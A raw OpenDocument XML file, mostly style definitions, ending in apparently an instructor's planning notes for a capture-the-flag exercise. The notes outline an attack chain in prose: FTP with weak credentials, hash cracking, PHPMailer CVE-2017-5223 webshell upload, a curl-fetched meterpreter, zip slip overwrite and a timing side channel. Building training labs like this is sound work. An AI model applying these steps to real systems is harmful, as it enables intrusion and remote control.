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liberation mono', 'courier new', monospace"/>
    <style:font-face style:name="Monaco1" svg:font-family="Monaco, Consolas, 'Andale Mono', 'DejaVu Sans Mono', monospace"/>
    <style:font-face style:name="Monaco2" svg:font-family="Monaco, Menlo, Consolas, 'Courier New', monospace"/>
    <style:font-face style:name="Monaco" svg:font-family="Monaco, monospace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ato" svg:font-family="lat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0pt" officeooo:rsid="000d817d" officeooo:paragraph-rsid="000ea113" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P2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" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d817d" officeooo:paragraph-rsid="000d817d"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000ea113" officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0011fa13" officeooo:paragraph-rsid="0011fa13"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00141009" officeooo:paragraph-rsid="00141009"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00141009" officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00141009"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00181f3e" officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0019d7c6" officeooo:paragraph-rsid="0019d7c6"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001ae19f" officeooo:paragraph-rsid="001ae19f"/>
    </style:style>
    <style:style style:name="P13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paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#373737" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d817d" officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#373737" style:font-name="monospace" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0010cd18" officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002cdb5d" officeooo:paragraph-rsid="002cdb5d"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002d1be6" officeooo:paragraph-rsid="002d1be6"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00355afd" officeooo:paragraph-rsid="00355afd"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003c83af" officeooo:paragraph-rsid="003c83af"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003e064d" officeooo:paragraph-rsid="003e064d"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003eca6d" officeooo:paragraph-rsid="003eca6d"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0041e380" officeooo:paragraph-rsid="0041e380"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0042bd93" officeooo:paragraph-rsid="0042bd93"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0044b5bf" officeooo:paragraph-rsid="0044b5bf"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004bc14e" officeooo:paragraph-rsid="004bc14e"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004c8cc3" officeooo:paragraph-rsid="004c8cc3"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004d79c0" officeooo:paragraph-rsid="004d79c0"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004d9e10" officeooo:paragraph-rsid="004d9e10"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00523c20" officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005a54c2" officeooo:paragraph-rsid="000d817d"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005a54c2" officeooo:paragraph-rsid="005a54c2"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005b86b4" officeooo:paragraph-rsid="005b86b4"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00609905" officeooo:paragraph-rsid="0066b518"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0060b1b5" officeooo:paragraph-rsid="0060b1b5"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006ade1b"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006b43b4"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006f9525"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="007105f4"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="0076d908"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006b43b4" officeooo:paragraph-rsid="006b43b4"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006f9525" officeooo:paragraph-rsid="006f9525"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="007105f4" officeooo:paragraph-rsid="007105f4"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="006ade1b"/>
    </style:style>
    <style:style style:name="P45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46" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#24292e" style:font-name="SFMono-Regular" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#55585a" style:font-name="Roboto" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d817d" officeooo:paragraph-rsid="00831030"/>
    </style:style>
    <style:style style:name="P48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523c20" officeooo:paragraph-rsid="00523c20" fo:background-color="#f6f8fa" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P49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53e1ae" officeooo:paragraph-rsid="00523c20" fo:background-color="#f6f8fa" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="009a57c8" officeooo:paragraph-rsid="00ba8779" fo:background-color="#f6f8fa" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Consolas1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00355afd" officeooo:paragraph-rsid="003011d6"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0065500b" officeooo:paragraph-rsid="0066b518"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="0076d908"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="007105f4"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="00d221a9"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="00fdb316"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d817d" officeooo:paragraph-rsid="000d817d"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d817d" officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00831030" officeooo:paragraph-rsid="00831030"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006b43b4" officeooo:paragraph-rsid="00a7bab7"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0088c969" officeooo:paragraph-rsid="0088c969" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="006b43b4"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0060b1b5" officeooo:paragraph-rsid="0060b1b5"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0060b1b5" officeooo:paragraph-rsid="00a1e653"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:paragraph-rsid="00523c20" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="000d817d" officeooo:paragraph-rsid="00523c20" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="009c8fba"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00a5b060"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00a7bab7"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="006ade1b"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00523c20" officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00c8b62f" officeooo:paragraph-rsid="00d75eba"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00c9222f" officeooo:paragraph-rsid="00d75eba"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00d0e4d8" officeooo:paragraph-rsid="00d0e4d8"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00d3b92a"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00d42155"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00d75eba"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00db54a4"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005cd9e8" officeooo:paragraph-rsid="005cd9e8"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00eeaa34" officeooo:paragraph-rsid="00eeaa34"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00fdb316" officeooo:paragraph-rsid="00fdb316"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00f1f664"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="01025dcf" officeooo:paragraph-rsid="01025dcf"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="01025dcf"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="000ea113"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#373737" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d817d"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" style:font-name="lato" fo:font-size="12pt" fo:letter-spacing="0.0102in" fo:font-style="normal" fo:font-weight="normal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officeooo:rsid="0083103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005cc5" style:font-name="SFMono-Regular" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T9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523c20" fo:background-color="#f6f8fa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94e3eb" fo:background-color="#f6f8fa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dd416e" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T1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e2edeb" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T1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95e05c" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00523c20" fo:background-color="#f6f8fa" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0053978b" fo:background-color="#f6f8fa" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" officeooo:rsid="000d817d"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="00132645"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="00141009"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="0015aa68"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="00181f3e"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#d73a49"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#005cc5"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="00459775"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="00523c20"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="0060b1b5"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="006256ad"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="0064dee4"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="0064f67a"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="0065500b"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="0066b518"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties officeooo:rsid="006ade1b"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties officeooo:rsid="00798105"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties officeooo:rsid="007d4378"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties officeooo:rsid="007fccb1"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties officeooo:rsid="00849249"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties officeooo:rsid="008c30ab"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties officeooo:rsid="00966f79"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties officeooo:rsid="00983c12"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="00523c20" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties officeooo:rsid="009c8fba"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties officeooo:rsid="00b56e98"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties officeooo:rsid="00c27398"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties officeooo:rsid="00c45d3b"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties officeooo:rsid="00c8b62f"/>
    </style:style>
    <style:style style:name="T46" style:family="text">
      <style:text-properties officeooo:rsid="00cc42ea"/>
    </style:style>
    <style:style style:name="T47" style:family="text">
      <style:text-properties officeooo:rsid="00d221a9"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties officeooo:rsid="00d4f62c"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties officeooo:rsid="00d75eba"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties officeooo:rsid="00d8b953"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties officeooo:rsid="00da3a34"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
      <style:text-properties officeooo:rsid="00dc43dc"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties officeooo:rsid="00ddf0c7"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties officeooo:rsid="00e3abf6"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
      <style:text-properties officeooo:rsid="00e628b4"/>
    </style:style>
    <style:style style:name="T56" style:family="text">
      <style:text-properties officeooo:rsid="00e79ea6"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties officeooo:rsid="00ef1a40"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties officeooo:rsid="00f1f664"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties officeooo:rsid="00f36bb0"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties officeooo:rsid="00fdb316"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties officeooo:rsid="0100ed4f"/>
    </style:style>
    <style:style style:name="T62" style:family="text">
      <style:text-properties officeooo:rsid="006b43b4"/>
    </style:style>
    <style:style style:name="T63" style:family="text">
      <style:text-properties officeooo:rsid="01025dcf"/>
    </style:style>
    <style:style style:name="T64" style:family="text">
      <style:text-properties officeooo:rsid="010393fc"/>
    </style:style>
    <style:style style:name="T65" style:family="text">
      <style:text-properties officeooo:rsid="01040e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Exercise So Far:</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29"><text:bookmark-start text:name="__DdeLink__859_2392804040"/>https://github.com/qazbnm456/awesome-cve-poc<text:bookmark-end text:name="__DdeLink__859_2392804040"/></text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P81">The main objective is to obtain the bamba recepy.</text:p>
      <text:p text:style-name="P82">Remember to delete the installation files <text:span text:style-name="T57">in /home/installations.sh</text:span>.</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P36">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T31">WEBSERVER</text:span><text:span text:style-name="T24">: </text:span><text:span text:style-name="T33">accesible from the attacker.</text:span><text:span text:style-name="T24"> </text:span></text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P77">* <text:span text:style-name="T50">The webserver is running on https.</text:span></text:p>
      <text:p text:style-name="P77">* <text:span text:style-name="T51">S</text:span><text:span text:style-name="T50">o burp is need to intercept the communication.</text:span></text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T36">* Python ftp server </text:span><text:span text:style-name="T41">with weak default creds. The ftp server has </text:span><text:span text:style-name="T43">only </text:span><text:span text:style-name="T41">read </text:span><text:span text:style-name="T43">premision</text:span><text:span text:style-name="T41">.</text:span></text:p>
      <text:p text:style-name="P77">* <text:span text:style-name="T51">In The ftp server there is a pcap file containing a sniff of http authentication to the website.</text:span></text:p>
      <text:p text:style-name="P77">* <text:span text:style-name="T51">The authentication is md5 with sult, they need to crack via hashcat.</text:span></text:p>
      <text:p text:style-name="P78">* <text:span text:style-name="T48">After login, there is the mail vulnerability – </text:span><text:span text:style-name="T52">they need to preform it with burp</text:span><text:span text:style-name="T48">.</text:span></text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T24">* using th</text:span><text:span text:style-name="T40">e phpmailer vulnerability – </text:span><text:a xlink:type="simple" xlink:href="https://github.com/vulhub/vulhub/tree/master/phpmailer/CVE-2017-5223" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T39">CVE-2017-5223</text:span></text:a><text:span text:style-name="T8">, </text:span><text:span text:style-name="T9">one can upload a php webshell of choise – need them to create the python script to do the vulnerability or use burpsuit </text:span><text:span text:style-name="T10">or metasploit</text:span><text:span text:style-name="T9">.</text:span></text:p>
      <text:p text:style-name="P66"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T9">* </text:span><text:span text:style-name="T11">the ftp will point </text:span><text:span text:style-name="T12">to the website</text:span><text:span text:style-name="T13">.</text:span></text:p>
      <text:p text:style-name="P48"/>
      <text:p text:style-name="P66"><text:span text:style-name="T14">* consider adding </text:span><text:span text:style-name="T15">phpmyadmin latest for confusion purpeses.</text:span></text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49">* <text:span text:style-name="T37">The goal is to get a meterpeter shell </text:span><text:span text:style-name="T53">from a php webshell </text:span><text:span text:style-name="T37">- </text:span></text:p>
      <text:p text:style-name="P50">This website shows how to get a meterpeter from a php webshell: <text:bookmark-start text:name="__DdeLink__850_2392804040"/><text:span text:style-name="T37">https://www.hacking.reviews/2017/02/webshell-to-meterpreter.html?m=1</text:span><text:bookmark-end text:name="__DdeLink__850_2392804040"/></text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P36"><text:bookmark-start text:name="__DdeLink__620_2786724775"/><text:bookmark-start text:name="__DdeLink__861_2392804040"/><text:bookmark-start text:name="__DdeLink__626_2786724775"/><text:bookmark-start text:name="__DdeLink__618_2786724775"/>---------------------------------------------------------------------------------<text:bookmark-end text:name="__DdeLink__620_2786724775"/><text:bookmark-end text:name="__DdeLink__861_2392804040"/><text:bookmark-end text:name="__DdeLink__626_2786724775"/><text:bookmark-end text:name="__DdeLink__618_2786724775"/></text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P83">The ProFtp with apache:</text:p>
      <text:p text:style-name="P85">from metasploit you get a cmd on the server.</text:p>
      <text:p text:style-name="P85">Then look inside the <text:span text:style-name="T64">vm searching for curl.</text:span></text:p>
      <text:p text:style-name="P86"><text:span text:style-name="T63">Using the cmd and curl </text:span><text:span text:style-name="T65">download a meterpeter from the attacker.</text:span></text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P56">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44"><text:span text:style-name="T32">LibSSH vulnerability – </text:span><text:span text:style-name="T42">accesible to attacker – </text:span><text:span text:style-name="T32">.</text:span></text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P63"><text:span text:style-name="T62">* </text:span><text:span text:style-name="T61">from command execution should get to </text:span></text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"><text:span text:style-name="T34">in metasploit: </text:span>scanner/ssh/ssh_version</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P84"><text:span text:style-name="T58">The </text:span><text:span text:style-name="T60">Zip slip</text:span><text:span text:style-name="T58"> with side channell attack.</text:span></text:p>
      <text:p text:style-name="P68"><text:span text:style-name="T41">Missions:</text:span><text:bookmark-start text:name="__DdeLink__852_2392804040"/><text:bookmark-end text:name="__DdeLink__852_2392804040"/></text:p>
      <text:p text:style-name="P68">* <text:span text:style-name="T49">There is login with password need to bypass using the side channel attack.</text:span></text:p>
      <text:p text:style-name="P68">* <text:span text:style-name="T59">in the website, </text:span><text:span text:style-name="T54">.</text:span></text:p>
      <text:p text:style-name="P69">* <text:span text:style-name="T55">maybe it imports time </text:span><text:span text:style-name="T56">to calculate the time or other python file, so overwrtie the file with msfvenum python meterpeter.</text:span></text:p>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P73"><text:soft-page-break/>Crypto side channel attack – <text:span text:style-name="T46">NO NEED FOR ONLINE</text:span>:</text:p>
      <text:p text:style-name="P73"/>
      <text:p text:style-name="P79"><text:span text:style-name="T45">get the password via the time to execute the calculation of the password is correct.</text:span></text:p>
